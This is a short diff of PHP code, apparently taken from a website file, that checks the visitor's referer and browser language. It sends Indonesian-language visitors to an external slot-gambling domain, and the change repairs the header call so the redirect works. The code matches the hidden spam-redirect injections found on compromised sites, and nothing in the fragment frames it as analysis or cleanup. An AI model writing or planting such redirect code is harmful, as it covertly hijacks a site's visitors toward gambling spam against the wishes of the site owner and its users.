@@ -15,7 +15,7 @@ $s_ref = $_SERVER['HTTP_REFERER'];
     }
     $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
     if ($browserLang == 'id') {
-        header("https://ibo-slot-gacor.web.app/");
+        header("Location: https://ibo-slot-gacor.web.app/");
         exit;
     }
 /**
